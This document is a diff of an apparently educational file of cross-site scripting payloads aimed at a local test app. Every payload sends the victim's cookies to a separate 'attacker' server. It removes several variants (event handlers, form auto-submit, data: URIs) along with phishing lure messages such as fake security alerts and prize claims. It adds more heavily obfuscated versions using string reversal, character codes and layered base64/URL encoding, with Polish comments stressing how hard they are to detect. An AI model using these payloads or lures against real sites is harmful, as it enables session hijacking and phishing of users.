@@ -1,11 +1,4 @@
-// ⚠️ WARNING: These are MALICIOUS scripts for educational purposes only!
-
-
-// ============================================================
-// BASE URL (target application)
-// ============================================================
-const TARGET = "http://localhost:5009";
-const ATTACKER = "http://localhost:8888";
+// WARNING: These are MALICIOUS scripts for educational purposes only!
 
 
 // ============================================================
@@ -14,10 +7,7 @@ const ATTACKER = "http://localhost:8888";
 // Social engineering: "Check out this cool feature!"
 // URL parameter contains <img> tag with onerror that steals cookie
 
-http://localhost:5009/protected?search=<img src=x onerror="new Image().src='http://localhost:8888/steal?cookie='+document.cookie">
-
-// Alternative with fetch (modern browsers):
-// http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
 
 
 // ============================================================
@@ -73,104 +63,24 @@ http://localhost:5009/protected?search=<iframe src="http://localhost:8888/steal?
 
 
 // ============================================================
-// PAYLOAD #8: Double Encoded
+// PAYLOAD #8: String Reversal Trick
 // ============================================================
-// Double URL encoding to bypass WAF/filters
-// %253C = %3C = <
+// String odwrócony i odwracany z powrotem - ekstremalnie ukryty
 
-http://localhost:5009/protected?search=%253Cscript%253Efetch('http://localhost:8888/steal?cookie='%252Bdocument.cookie)%253C/script%253E
-
-
-// ============================================================
-// PAYLOAD #9: Event Handler XSS
-// ============================================================
-// Using various HTML events: onclick, onmouseover, onfocus
-
-http://localhost:5009/protected?search=<div onmouseover="fetch('http://localhost:8888/steal?cookie='+document.cookie)">Hover me!</div>
+http://localhost:5009/protected?search=<img src=x onerror="eval('eikooc.tnemucod+\'=c?laets/8888:tsohlacol//:ptth\'=crs.)egamI wen'.split('').reverse().join(''))">
 
 
 // ============================================================
-// PAYLOAD #10: Base64 Encoded JavaScript
+// PAYLOAD #9: CharCode Encoding
 // ============================================================
-// Obfuscated payload using base64 encoding
+// Buduje string z kodów znaków - bardzo trudny do odczytania
 
-http://localhost:5009/protected?search=<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6ODg4OC9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWUp'))">
-
-// Decoded: fetch('http://localhost:8888/steal?cookie='+document.cookie)
-
+http://localhost:5009/protected?search=<img src=x onerror="eval(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,39,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,56,56,56,56,47,115,116,101,97,108,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))">
 
 // ============================================================
-// PAYLOAD #11: Shortened/Obfuscated URL
+// PAYLOAD #10: Multiple Encoding Layers
 // ============================================================
-// Using data: URI to hide malicious content
-// Looks innocent but contains JavaScript
+// Podwójne kodowanie - Base64 + URL encode
+// Ekstremalnie trudne do wykrycia
 
-data:text/html,<script>fetch('http://localhost:8888/steal?cookie='+document.cookie);location='http://localhost:5009'</script>
-
-
-// ============================================================
-// PAYLOAD #12: Form Auto-Submit
-// ============================================================
-// Creates hidden form that auto-submits cookie to attacker
-
-http://localhost:5009/protected?search=<form id=x action=http://localhost:8888/steal><input name=cookie></form><script>x.cookie.value=document.cookie;x.submit()</script>
-
-
-// ============================================================
-// PAYLOAD #13: Meta Refresh with JavaScript
-// ============================================================
-// Uses meta refresh to execute JavaScript
-
-http://localhost:5009/protected?search=<meta http-equiv="refresh" content="0;url=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">
-
-
-// ============================================================
-// PAYLOAD #14: Object/Embed Tag
-// ============================================================
-// Using object tag to load external resource
-
-http://localhost:5009/protected?search=<object data="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">
-
-
-// ============================================================
-// PAYLOAD #15: Link with JavaScript
-// ============================================================
-// Creates clickable link with javascript: protocol
-// Social engineering: "Click here to continue"
-
-http://localhost:5009/protected?search=<a href="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">Click to verify account</a>
-
-
-// ============================================================
-// SOCIAL ENGINEERING SCENARIOS
-// ============================================================
-
-/**
- * SCENARIO 1: Fake Security Alert
- * Message: "⚠️ Security Alert! Your account requires verification. Click here immediately:"
- * Link: [obfuscated XSS URL]
- */
-
-/**
- * SCENARIO 2: Prize/Contest Winner
- * Message: "🎉 Congratulations! You won $1000! Claim your prize here:"
- * Link: [malicious URL]
- */
-
-/**
- * SCENARIO 3: Password Reset
- * Message: "Someone requested password reset for your account. If this wasn't you, click here:"
- * Link: [XSS payload URL]
- */
-
-/**
- * SCENARIO 4: Friend Request
- * Message: "Sarah wants to add you as friend! View profile:"
- * Link: [cookie stealing URL]
- */
-
-/**
- * SCENARIO 5: Urgent Support Ticket
- * Message: "Your support ticket #12345 has been updated. View details:"
- * Link: [malicious link]
- */
+http://localhost:5009/protected?search=%3Cimg%20src%3Dx%20onerror%3D%22eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vbG9jYWxob3N0Ojg4ODgvc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))%22%3E
